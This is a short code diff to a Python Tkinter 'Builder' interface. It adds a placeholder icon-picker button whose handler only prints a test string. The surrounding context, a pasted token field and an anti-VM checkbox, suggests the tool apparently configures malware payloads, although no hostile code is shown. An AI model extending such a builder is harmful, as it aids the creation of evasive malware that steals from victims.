@@ -561,6 +561,9 @@ class Builder:
     def paste_token(self):
         self.token_entry.insert(0, pyperclip.paste())
 
+    def change_icon(self):
+        print('asd')
+
     def general_settings(self):
         self.general_settings_button['state'] = tk.DISABLED
         self.general_settings_button['relief'] = 'flat'
@@ -1179,7 +1182,23 @@ class Builder:
             window=self.cb_antivm, 
             anchor='w')
 
-
+        self.canvas.create_text(
+            100,
+            205,
+            text='Icon:', 
+            fill='white', 
+            font=(
+                'Consolas', 
+                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']), 
+            anchor=tk.W)
+        
+        self.icon_photo = ImageTk.PhotoImage(Image.open('resources/icons/default_icon.png').resize((100, 100)))
+        icon_btn = tk.Button(self.canvas, relief='flat', cursor='hand2', image=self.icon_photo, state=tk.NORMAL, width=100, height=100, command=self.change_icon)
+        self.canvas.create_window(
+            100,
+            220,
+            window=icon_btn,
+            anchor='nw')
 
 
 
